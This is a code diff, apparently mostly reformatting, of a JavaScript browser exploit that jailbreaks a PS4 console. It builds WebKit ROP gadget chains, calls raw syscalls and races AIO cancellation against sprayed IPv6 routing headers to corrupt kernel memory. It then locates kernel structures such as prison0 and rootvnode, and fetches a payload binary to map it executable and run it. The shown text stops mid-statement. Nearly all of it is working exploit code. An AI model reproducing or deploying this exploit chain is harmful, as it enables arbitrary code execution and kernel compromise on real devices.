+          const kb = new ArrayBuffer(8192),
+            fb = new ArrayBuffer(64);
+          keepAlive2.push(sb, pb, kb, fb);
+          const c = {
+            storeDv: new DataView(sb),
+            pivotDv: new DataView(pb),
+            stackDv: new DataView(kb),
+            frameDv: new DataView(fb),
+            stackU8: new Uint8Array(kb),
+            frameU8: new Uint8Array(fb),
+          };
+          keepAlive2.push(
+            c.storeDv,
+            c.pivotDv,
+            c.stackDv,
+            c.frameDv,
+            c.stackU8,
+            c.frameU8,
+          );
+          c.S = bufAddr(sb);
+          c.P = bufAddr(pb);
+          c.K = bufAddr(kb);
+          c.F = bufAddr(fb);
+          put(c.storeDv, 0, G.G1);
+          put(c.storeDv, 8, c.P);
+          put(c.storeDv, 16, G.G3);
+          put(c.storeDv, 24, G.G2);
+          put(c.pivotDv, 0, c.P);
+          put(c.pivotDv, 16, G.G5);
+          put(c.pivotDv, 32, G.G4);
+          return c;
+        },
+        layout = function (c, target, args) {
+          c.stackU8.fill(0);
+          c.frameU8.fill(0);
+          const insts = [];
+          for (let i = 0; i < args.length; ++i) {
+            insts.push(argGadget[i]);
+            insts.push(args[i]);
+          }
+          const targetIdx = insts.length;
+          insts.push(target);
+          insts.push(G.POP_RDI_RET);
+          insts.push(c.F);
+          insts.push(G.MOV_RDI_RAX_RET);
+          insts.push(G.POP_RAX_RET);
+          insts.push(JSVALUE_UNDEFINED);
+          insts.push(G.LEAVE_RET);
+          let at = 8192 - 8 * insts.length;
+          if (((c.K.low + at + 8 * targetIdx) & 15) !== 0) at -= 8;
+          for (let i = 0; i < insts.length; ++i)
+            put(c.stackDv, at + 8 * i, insts[i]);
+          put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
+        },
+        callAddr = function (target, args) {
+          layout(M, target, args);
+          const saved = p.read8(pivotCell);
+          p.write8(pivotCell, M.S);
+          Math.expm1(pivotObj);
+          p.write8(pivotCell, saved);
+          return {
+            lo: M.frameDv.getUint32(0, true),
+            hi: M.frameDv.getUint32(4, true),
+            i32: M.frameDv.getUint32(0, true) | 0,
+          };
+        },
+        errno = function () {
+          const r = callAddr(errorFn, []);
+          const a = new int64(r.lo, r.hi);
+          return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
+        },
+        makeRpc = function (wk, name) {
+          let seq = 0;
+          const pending = /* @__PURE__ */ new Map();
+          wk.onmessage = function (e) {
+            const d = e.data || {};
+            const slot = pending.get(d.id);
+            if (!slot) return;
+            pending.delete(d.id);
+            if (slot.timer) clearTimeout(slot.timer);
+            if (d.type === "err") slot.reject(new Error(String(d.value)));
+            else slot.resolve(d.value);
+          };
+          wk.onerror = (e) =>
+            mark(
+              "WORKER-ONERROR",
+              name + " " + (e && e.message ? e.message : String(e)),
+            );
+          return function call(fname, timeoutMs, ...args) {
+            return new Promise(function (resolve, reject) {
+              const id = seq++;
+              const timer =
+                timeoutMs > 0
+                  ? setTimeout(function () {
+                      pending.delete(id);
+                      reject(
+                        new Error(name + ": timeout waiting for " + fname),
+                      );
+                    }, timeoutMs)
+                  : null;
+              pending.set(id, { resolve, reject, timer });
+              wk.postMessage({ id, name: fname, args });
+            });
+          };
+        },
+        ptrish = function (v) {
+          return v.hi > 0 && v.hi < 65536 && (v.low & 7) === 0;
+        },
+        setNode0 = function (nextAddr, secondDec) {
+          new Uint8Array(pAb).fill(0);
+          pDv.setUint8(1, RTH_LEN);
+          pDv.setUint8(3, RTH_SEGLEFT);
+          put(pDv, 8, secondDec);
+          put(pDv, 16, M_AD);
+          put(pDv, 48, nextAddr);
+        },
+        presetNode0Dec = function () {
+          n0dDv.setUint32(0, 4, true);
+          n0dDv.setUint32(4, 0, true);
+          return sc(
+            SYS.getsockopt,
+            POOL[0],
+            SOL_SOCKET,
+            SO_TYPE,
+            NODE0_DEC,
+            n0dAd,
+          ).i32;
+        },
+        armOnce = function () {
+          try {
+            if (typeof A !== "undefined" && A) A.busy = 1;
+          } catch (e) {}
+          const g = armCount + 1;
+          const at = function (t, d) {
+            if (armTrace) trace(t, "a=" + g + " " + d);
+          };
+          at("ARM-P1-FREE", "pool=" + POOL.length);
+          for (const fd of POOL)
+            sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+          at("ARM-P2-SUBMIT", "freed=" + POOL.length);
+          const rs = sc(
+            SYS.aio_submit_cmd,
+            1 | 4096,
+            bufAddr(rqAb),
+            NUM,
+            3,
+            idAd2,
+          ).i32;
+          if (rs !== 0) {
+            at("ARM-SUBMIT-FAIL", "rs=" + rs);
+            return "submit=" + rs;
+          }
+          toDv.setUint32(0, TOWAIT, true);
+          toDv.setUint32(4, 0, true);
+          at(
+            "ARM-P3-WAIT",
+            "to=" +
+              TOWAIT +
+              "us submit=0 to_rb=" +
+              toDv.getUint32(0, true) +
+              " toad=" +
+              toAd,
+          );
+          const tw0 = Date.now();
+          sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
+          armedEver = true;
+          waitMs = Date.now() - tw0;
+          let n = 0;
+          for (const fd of POOL)
+            if (
+              sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
+                .i32 === 0
+            )
+              n++;
+          armCount++;
+          at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
+          return "ok sprayed=" + n + " wait=" + waitMs + "ms";
+        },
+        wnode = function (i, decAddr, sinkAddr, last) {
+          const o = i * NODE_SZ;
+          put(arDv, o + 0, decAddr);
+          put(arDv, o + 8, sinkAddr);
+          put(arDv, o + 16, M_AD);
+          put(arDv, o + 24, 0);
+          put(arDv, o + 32, 0);
+          put(arDv, o + 40, 0);
+          put(arDv, o + 48, last ? 0 : arAd.add32(o + NODE_SZ));
+        },
+        neutralise = function (where, sink) {
+          setNode0(0, sink);
+          let renew2 = 0;
+          for (const fd of POOL)
+            if (
+              sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
+                .i32 === 0
+            )
+              renew2++;
+          mark(
+            "PR-NEUTRALISE-EARLY",
+            where + " next=0 on " + renew2 + "/" + POOL.length,
+          );
+        },
+        fireOk = function (where) {
+          if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
+          mark(
+            "REFUSING-TO-INTERPRET",
+            where +
+              " node0_sink=" +
+              lastFire.n0 +
+              " f_socket=" +
+              lastFire.fsock +
+              " forced=" +
+              (lastFire.faked ? 1 : 0),
+          );
+          neutralise(where, N0SINK);
+          return false;
+        },
+        whoHasF = function () {
+          let found = -1,
+            hits = 0,
+            state0 = 0;
+          for (let i = 0; i < POOL.length; i++) {
+            glDv.setInt32(0, RTH_SIZE, true);
+            glDv.setInt32(4, 0, true);
+            new Uint8Array(gfAb).fill(0);
+            if (
+              sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
+                .i32 !== 0
+            )
+              continue;
+            const st = gfDv.getUint32(32, true) >>> 0;
+            if (st !== 0) {
+              hits++;
+              if (found < 0) {
+                found = i;
+                state0 = st;
+              }
+            }
+          }
+          return { idx: found, hits, state: state0 };
+        },
+        reapNow = function (tag) {
+          if (!REAP || reapedGen === armCount) return;
+          wnode(0, DUM, DUM, true);
+          reapedGen = armCount;
+          const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
+          let stsC = "";
+          for (let k = 0; k < NUM; k++)
+            stsC +=
+              (k ? "," : "") +
+              (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+          const p2 = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
+          let stsP = "";
+          for (let k = 0; k < NUM; k++)
+            stsP +=
+              (k ? "," : "") +
+              (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+          const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
+          let sts = "";
+          for (let k = 0; k < NUM; k++)
+            sts +=
+              (k ? "," : "") +
+              (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
+          reapAt = Date.now();
+          mark(
+            "REAP",
+            tag +
+              " gen=" +
+              reapedGen +
+              " cancel=" +
+              c +
+              " poll=" +
+              p2 +
+              " delete=" +
+              d +
+              " c=[" +
+              stsC +
+              "] p=[" +
+              stsP +
+              "] st=[" +
+              sts +
+              "]",
+          );
+        },
+        runChain = function (nNodes, label) {
+          snkDv.setInt32(0, 1073741824, true);
+          snkDv.setInt32(32, 1073741824, true);
+          trace(
+            "CH-MTX-PRE",
+            label +
+              " owner=" +
+              (mU32[OWNER_HI] >>> 0).toString(16) +
+              ":" +
+              (mU32[OWNER_LO] >>> 0).toString(16) +
+              " want=0:4",
+          );
+          mU32[OWNER_LO] = 4;
+          mU32[OWNER_HI] = 0;
+          let a = "ok reused";
+          if (fireIdx >= FIRES) {
+            const n0save = arAb.slice(0, NODE_SZ);
+            reapNow("pre-arm a=" + armCount);
+            new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
+            setNode0(arAd, N0SINK);
+            a = armOnce();
+            if (a.indexOf("ok") !== 0) {
+              mark("PR-ARM-FAIL", label + " " + a);
+              return null;
+            }
+            fireIdx = 0;
+          } else {
+            setNode0(arAd, N0SINK);
+          }
+          const fireN = fireIdx;
+          sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
+          fireIdx++;
+          trace(
+            "CH-CANCEL-DONE",
+            label +
+              " nodes=" +
+              nNodes +
+              " fire=" +
+              fireN +
+              "/" +
+              FIRES +
+              " arm=" +
+              armCount +
+              " returned",
+          );
+          const moved = 1073741824 - snkDv.getInt32(0, true);
+          const w = whoHasF();
+          const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
+          const n0 = faked ? 0 : 1073741824 - snkDv.getInt32(32, true);
+          lastFire = {
+            n0,
+            fsock: w.idx,
+            fhits: w.hits,
+            faked,
+            label,
+          };
+          mark(
+            "PR-FIRE",
+            label +
+              " nodes=" +
+              nNodes +
+              " sink_moved=" +
+              moved +
+              " node0_sink=" +
+              n0 +
+              " forced=" +
+              (faked ? 1 : 0) +
+              " f_socket=" +
+              w.idx +
+              " f_hits=" +
+              w.hits +
+              " state=0x" +
+              w.state.toString(16) +
+              " (" +
+              a +
+              ")",
+          );
+          if (n0 === 1 && w.idx < 0)
+            mark(
+              "PR-F-UNSEEN",
+              "node0 fired but no pool socket carries the state write -- F went to something outside the pool",
+            );
+          return moved;
+        },
+        simPattern = function (bv, low) {
+          let w = ((bv << 24) >>> 0) | (low & 16777215) | 0;
+          let out = "";
+          for (let k = 0; k < SWEEP; k++) {
+            w = (w - STEPMAG) | 0;
+            w = (w - 1) | 0;
+            out += w <= 0 ? "1" : "0";
+          }
+          return out;
+        },
+        decodeByte = function (obs, low) {
+          let hit = -1,
+            n = 0;
+          for (let bv = 0; bv < 256; bv++)
+            if (simPattern(bv, low) === obs) {
+              if (hit < 0) hit = bv;
+              n++;
+            }
+          return { b: hit, n };
+        },
+        oracleAt = function (addr, n, label) {
+          const sAb = new ArrayBuffer(4);
+          keepAlive2.push(sAb);
+          const sDv = new DataView(sAb),
+            sAd = bufAddr(sAb);
+          sDv.setInt32(0, 1073741824, true);
+          let i = 0;
+          for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
+          put(arDv, (i - 1) * NODE_SZ + 48, 0);
+          if (runChain(i, label) === null) return null;
+          if (!fireOk(label)) return null;
+          const m = 1073741824 - sDv.getInt32(0, true);
+          return { m, v: m > 0 ? n - m + 1 : 0 };
+        },
+        sweepAt = function (stepAd, probeAd, low, label) {
+          const sAb = new ArrayBuffer(4 * SWEEP);
+          keepAlive2.push(sAb);
+          const sDv = new DataView(sAb),
+            sAd = bufAddr(sAb);
+          for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 1073741824, true);
+          let i = 0;
+          for (let k = 0; k < SWEEP; k++) {
+            wnode(i++, stepAd, DUM, false);
+            wnode(i++, probeAd, sAd.add32(k * 4), false);
+          }
+          put(arDv, (i - 1) * NODE_SZ + 48, 0);
+          if (runChain(i, label) === null) return null;
+          if (!fireOk(label)) return null;
+          let obs = "";
+          for (let k = 0; k < SWEEP; k++)
+            obs += 1073741824 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
+          return decodeByte(obs, low);
+        },
+        planSub = function (cur, delta) {
+          const d = [
+            delta & 255,
+            (delta >>> 8) & 255,
+            (delta >>> 16) & 255,
+            (delta >>> 24) & 255,
+          ];
+          let clean = true;
+          for (let j = 1; j < 4; j++)
+            if (d[j] > ((cur >>> (8 * j)) & 255)) clean = false;
+          return { d, n: d[0] + d[1] + d[2] + d[3], clean };
+        },
+        emitSub = function (base, i, plan) {
+          const pos = [];
+          for (let j = 0; j < 4; j++)
+            for (let q = 0; q < plan.d[j]; q++) pos.push(j);
+          for (let j = 0; j < pos.length; j++)
+            wnode(i++, base.add32(pos[j]), DUM, false);
+          return i;
+        },
+        multiFire = function (jobs, label) {
+          let need2 = 0;
+          for (const j of jobs) need2 += j.kind === "sweep" ? SWEEP * 2 : j.n;
+          mark(
+            "MF-PLAN",
+            label +
+              " jobs=" +
+              jobs.length +
+              " nodes=" +
+              need2 +
+              " kinds=" +
+              jobs
+                .map(function (j) {
+                  return j.kind;
+                })
+                .join(","),
+          );
+          if (
+            !check(
+              "mf-bounded-" + label,
+              need2 > 0 && need2 <= MAXN,
+              "need=" + need2 + " arena=" + MAXN,
+            )
+          )
             return null;
-          });
-        put(arDv, (i - 1) * NODE_SZ + 48, 0);
-        if (runChain(i, label) === null) return null;
-        if (!fireOk(label)) return null;
-        const out = [];
-        for (let q = 0; q < jobs.length; q++) {
-          const j = jobs[q];
-          if (j.kind === "sweep") {
-            let obs = "";
-            for (let k = 0; k < SWEEP; k++)
-              obs += 1073741824 - sDv.getInt32((base[q] + k) * 4, true) > 0 ? "1" : "0";
-            out.push(decodeByte(obs, j.low));
-          } else if (j.kind === "oracle") {
-            const m = 1073741824 - sDv.getInt32(base[q] * 4, true);
-            out.push({ m, v: m > 0 ? j.n - m + 1 : 0 });
-          } else out.push({ n: j.n });
-        }
-        return out;
-      }, kernFile = function(withBuf, tag) {
-        olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
-        olDv.setInt32(4, 0, true);
-        const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
-        const rv = r.i32, er = rv < 0 ? errno() : 0;
-        const ln = olDv.getUint32(0, true);
-        mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
-        return { rv, err: er, len: ln };
-      }, planLow = function(cur, tgt) {
-        if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
-        const b = [];
-        for (let k = 0; k < 4; k++) b.push(cur.low >>> 8 * k & 255);
-        b.push(0, 0, 0, 0);
-        const t = [];
-        for (let k = 0; k < 4; k++) t.push(tgt.low >>> 8 * k & 255);
-        function decwin(j) {
-          let c = -1;
-          for (let k = 0; k < 4 && j + k < 8; k++) {
-            let v = b[j + k] + c;
-            if (v < 0) {
-              v += 256;
-              c = -1;
-            } else c = 0;
-            b[j + k] = v;
-            if (c === 0) break;
+          const nSink = jobs.reduce(function (a, j) {
+            return (
+              a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0)
+            );
+          }, 0);
+          const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
+          keepAlive2.push(sAb);
+          const sDv = new DataView(sAb),
+            sAd = bufAddr(sAb);
+          for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 1073741824, true);
+          let i = 0,
+            sk = 0;
+          const base = [];
+          for (const j of jobs) {
+            base.push(sk);
+            if (j.kind === "sweep") {
+              for (let k = 0; k < SWEEP; k++) {
+                wnode(i++, j.step, DUM, false);
+                wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
+              }
+              sk += SWEEP;
+            } else if (j.kind === "oracle") {
+              for (let k = 0; k < j.n; k++)
+                wnode(i++, j.addr, sAd.add32(sk * 4), false);
+              sk += 1;
+            } else {
+              for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
+            }
           }
-        }
-        const pos = [];
-        for (let j = 0; j < 4; j++) {
-          const d = b[j] - t[j] & 255;
-          for (let q = 0; q < d; q++) {
-            pos.push(j);
-            decwin(j);
+          if (i === 0)
+            return jobs.map(function () {
+              return null;
+            });
+          put(arDv, (i - 1) * NODE_SZ + 48, 0);
+          if (runChain(i, label) === null) return null;
+          if (!fireOk(label)) return null;
+          const out = [];
+          for (let q = 0; q < jobs.length; q++) {
+            const j = jobs[q];
+            if (j.kind === "sweep") {
+              let obs = "";
+              for (let k = 0; k < SWEEP; k++)
+                obs +=
+                  1073741824 - sDv.getInt32((base[q] + k) * 4, true) > 0
+                    ? "1"
+                    : "0";
+              out.push(decodeByte(obs, j.low));
+            } else if (j.kind === "oracle") {
+              const m = 1073741824 - sDv.getInt32(base[q] * 4, true);
+              out.push({ m, v: m > 0 ? j.n - m + 1 : 0 });
+            } else out.push({ n: j.n });
           }
-        }
-        const lowOk = b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
-        const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
-        if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090)
-          return null;
-        return pos;
-      };
+          return out;
+        },
+        kernFile = function (withBuf, tag) {
+          olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
+          olDv.setInt32(4, 0, true);
+          const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
+          const rv = r.i32,
+            er = rv < 0 ? errno() : 0;
+          const ln = olDv.getUint32(0, true);
+          mark(
+            "KF-SYSCTL",
+            tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln,
+          );
+          return { rv, err: er, len: ln };
+        },
+        planLow = function (cur, tgt) {
+          if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
+          const b = [];
+          for (let k = 0; k < 4; k++) b.push((cur.low >>> (8 * k)) & 255);
+          b.push(0, 0, 0, 0);
+          const t = [];
+          for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 255);
+          function decwin(j) {
+            let c = -1;
+            for (let k = 0; k < 4 && j + k < 8; k++) {
+              let v = b[j + k] + c;
+              if (v < 0) {
+                v += 256;
+                c = -1;
+              } else c = 0;
+              b[j + k] = v;
+              if (c === 0) break;
+            }
+          }
+          const pos = [];
+          for (let j = 0; j < 4; j++) {
+            const d = (b[j] - t[j]) & 255;
+            for (let q = 0; q < d; q++) {
+              pos.push(j);
+              decwin(j);
+            }
+          }
+          const lowOk =
+            b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
+          const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
+          if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090)
+            return null;
+          return pos;
+        };
       const { key, off } = offsetsFor(navigator.userAgent);
       mark("BUILD", "jb=skipjb2 base=ef1670a");
       mark("FW", key || "(not a PS4 UA)");
@@ -2663,42 +3053,67 @@
         "k_arg1_maxprocperuid",
         "k_arg1_maxfiles",
         "k_prison0",
-        "k_rootvnode"
+        "k_rootvnode",
       ];
       const missing = NEED_K.filter((k) => off[k] === void 0);
-      if (!check(
-        "kernel-table-present",
-        missing.length === 0,
-        "fw=" + fwKey + " missing=[" + missing.join(",") + "] -- dump this firmware with kdump5.html and derive its table with tools/kderive.py; stage=pre_primitive"
-      ))
+      if (
+        !check(
+          "kernel-table-present",
+          missing.length === 0,
+          "fw=" +
+            fwKey +
+            " missing=[" +
+            missing.join(",") +
+            "] -- dump this firmware with kdump5.html and derive its table with tools/kderive.py; stage=pre_primitive",
+        )
+      )
         return;
       const KPATCH_FILE = off.kpatch || fwKey.replace(".", "") + ".bin";
       const PAYLOAD_FILE = off.payload || "payload.bin";
       const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
-        (k) => off[k] === void 0
+        (k) => off[k] === void 0,
       );
-      if (!check(
-        "kpatch-table-present",
-        !DO_PATCH || needPatch.length === 0,
-        "missing=[" + needPatch.join(",") + "] blob=" + KPATCH_FILE + " -- build it from patches/<fw>.c, see patches/1300.c"
-      ))
+      if (
+        !check(
+          "kpatch-table-present",
+          !DO_PATCH || needPatch.length === 0,
+          "missing=[" +
+            needPatch.join(",") +
+            "] blob=" +
+            KPATCH_FILE +
+            " -- build it from patches/<fw>.c, see patches/1300.c",
+        )
+      )
         return;
       const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
-        (k) => off[k] === void 0
+        (k) => off[k] === void 0,
       );
-      if (!check(
-        "payload-table-present",
-        !DO_PAYLOAD || needPl.length === 0,
-        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE
-      ))
+      if (
+        !check(
+          "payload-table-present",
+          !DO_PAYLOAD || needPl.length === 0,
+          "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
+        )
+      )
         return;
       mark("FW-STATUS", off.fw_status || "none");
       mark(
         "FW-KTABLE",
-        "idt_rsvd=0x" + off.k_idt_rsvd.toString(16) + " prison0=0x" + off.k_prison0.toString(16) + " rootvnode=0x" + off.k_rootvnode.toString(16) + " kpatch=" + KPATCH_FILE + " payload=" + PAYLOAD_FILE + " src=ps4_offsets.js"
+        "idt_rsvd=0x" +
+          off.k_idt_rsvd.toString(16) +
+          " prison0=0x" +
+          off.k_prison0.toString(16) +
+          " rootvnode=0x" +
+          off.k_rootvnode.toString(16) +
+          " kpatch=" +
+          KPATCH_FILE +
+          " payload=" +
+          PAYLOAD_FILE +
+          " src=ps4_offsets.js",
       );
       const retryArg = parseInt(params.get("retry") || "", 10);
-      const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
+      const RETRY_MAX =
+        Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
       const RETRY_KEY = "jb1352-read-retry";
       const retryCount = () => {
         try {
@@ -2711,15 +3126,14 @@
       const clearRetry = () => {
         try {
           sessionStorage.removeItem(RETRY_KEY);
-        } catch (e) {
-        }
+        } catch (e) {}
       };
       const retryBenign = (why) => {
         const n = retryCount();
         if (n >= RETRY_MAX) {
           mark(
             "AUTO-RELOAD-GIVEUP",
-            "why=" + why + " reloads=" + n + " -- reboot and try again"
+            "why=" + why + " reloads=" + n + " -- reboot and try again",
           );
           return false;
         }
@@ -2733,19 +3147,18 @@
         if (stored !== n + 1) {
           mark(
             "AUTO-RELOAD-NO-STORAGE",
-            "why=" + why + " wrote=" + (n + 1) + " read=" + stored
+            "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
           );
           return false;
         }
         mark(
           "AUTO-RELOAD",
-          "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX
+          "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX,
         );
         setTimeout(() => {
           try {
             location.reload();
-          } catch (e) {
-          }
+          } catch (e) {}
         }, 400);
         return true;
       };
@@ -2756,33 +3169,40 @@
       const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
       const carrier2 = await establishPrimitive({
         maxAttempts: 6,
-        onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(
-          t,
-          (a != null ? "[" + a + "] " : "") + (d || "")
-        )
+        onEvent: (t, d, a) =>
+          (PRIMITIVE_LOUD.test(t) ? mark : trace)(
+            t,
+            (a != null ? "[" + a + "] " : "") + (d || ""),
+          ),
       });
       installWindowP(carrier2, { promote: false });
       if (!window.p) throw new Error("window.p was not installed");
       p = window.p;
       mark(
         "PAIR-STATUS",
-        "state=" + pairStatus.state + " promoted=" + pairStatus.promoted + "   (promotion off: the 137 MB stays pinned)"
+        "state=" +
+          pairStatus.state +
+          " promoted=" +
+          pairStatus.promoted +
+          "   (promotion off: the 137 MB stays pinned)",
       );
       mark("PRIMITIVE-OK", "");
       const cell = p.leakval(Math.expm1);
       const nativeFn = p.read8(
-        p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function)
+        p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function),
       );
       const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
       const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
       const libkernelBase = errorFn.sub32(off.k__error);
       mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
       const aligned = (v) => v.hi > 0 && (v.low & 16383) === 0;
-      if (!check(
-        "module-bases-0x4000-aligned",
-        aligned(webkitBase) && aligned(libkernelBase),
-        ""
-      ))
+      if (
+        !check(
+          "module-bases-0x4000-aligned",
+          aligned(webkitBase) && aligned(libkernelBase),
+          "",
+        )
+      )
         return;
       const G = {};
       const GAD = [
@@ -2797,18 +3217,14 @@
         [
           "MOV_RDI_RAX_RET",
           off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
-          [72, 137, 7, 195]
+          [72, 137, 7, 195],
         ],
         ["G0", off.wk_MOV_RDI_RSI_30_CALL, [72, 139, 126, 48]],
         ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [88, 72, 139, 7]],
         ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [85, 72, 137, 229]],
         ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [72, 139, 120, 8]],
-        [
-          "G4",
-          off.wk_MOV_RDX_RAX_18_CALL_10,
-          [72, 139, 80, off.pivot_view_sp]
-        ],
-        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [82, 92, 195]]
+        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [72, 139, 80, off.pivot_view_sp]],
+        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [82, 92, 195]],
       ];
       let gated = 0;
       for (const [nm, rva, pat] of GAD) {
@@ -2826,11 +3242,13 @@
           gated++;
         } else mark("GADGET-BAD", nm);
       }
-      if (!check(
-        "gadget-table-fits-module",
-        gated === GAD.length,
-        gated + "/" + GAD.length
-      ))
+      if (
+        !check(
+          "gadget-table-fits-module",
+          gated === GAD.length,
+          gated + "/" + GAD.length,
+        )
+      )
         return;
       const argGadget = [
         G.POP_RDI_RET,
@@ -2838,29 +3256,32 @@
         G.POP_RDX_RET,
         G.POP_RCX_RET,
         G.POP_R8_RET,
-        G.POP_R9_RET
+        G.POP_R9_RET,
       ];
       const stubAddr = /* @__PURE__ */ new Map();
       let seeded = 0;
       if (off.k_stubs) {
         for (const numStr in off.k_stubs) {
-          const num = +numStr, o = off.k_stubs[numStr];
+          const num = +numStr,
+            o = off.k_stubs[numStr];
           const v = p.read8(libkernelBase.add32(o));
           if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
-          if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 !== num)
+          if (((v.low >>> 24) | ((v.hi & 16777215) << 8)) >>> 0 !== num)
             continue;
           stubAddr.set(num, libkernelBase.add32(o));
           seeded++;
         }
       }
       const need = new Set(
-        Object.keys(SYS).map((k) => SYS[k]).filter((n) => !stubAddr.has(n))
+        Object.keys(SYS)
+          .map((k) => SYS[k])
+          .filter((n) => !stubAddr.has(n)),
       );
       let scanned = 0;
       for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
         const v = p.read8(libkernelBase.add32(o));
         if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
-        const num = (v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0;
+        const num = ((v.low >>> 24) | ((v.hi & 16777215) << 8)) >>> 0;
         if (!need.has(num)) continue;
         stubAddr.set(num, libkernelBase.add32(o));
         need.delete(num);
@@ -2870,7 +3291,7 @@
       const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
       if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
         return;
-      const PB_SIZE = Math.max(40, off.pivot_view_sp + 8 + 15 & ~15);
+      const PB_SIZE = Math.max(40, (off.pivot_view_sp + 8 + 15) & ~15);
       const M = makeCtx();
       mainMf = p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function);
       mainOrig = p.read8(mainMf);
@@ -2888,13 +3309,13 @@
           if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
           else mark("PAYLOAD-FETCH-ERR", "HTTP " + r.status);
         } catch (e) {
-          mark("PAYLOAD-FETCH-THREW", e && e.message || String(e));
+          mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
         }
         if (!blob || blob[0] !== 233) {
           mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
           return;
         }
-        const sz = blob.length + 16383 & ~16383;
+        const sz = (blob.length + 16383) & ~16383;
         const m = sc(SYS.mmap, 0, sz, 7, 4098, -1, 0);
         const entry = new int64(m.lo, m.hi);
         if (m.i32 === -1 || entry.hi >>> 0 === 0) {
@@ -2902,9 +3323,10 @@
           return;
         }
         for (let o = 0; o < blob.length; o += 8) {
-          let lo = 0, hi = 0;
-          for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << 8 * k;
-          for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << 8 * k;
+          let lo = 0,
+            hi = 0;
+          for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+          for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
           p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
         }
         let bad2 = -1;
@@ -2925,28 +3347,37 @@
         new Uint8Array(thr).fill(0);
         const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
         const tdv = new DataView(thr);
-        const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
+        const handle = new int64(
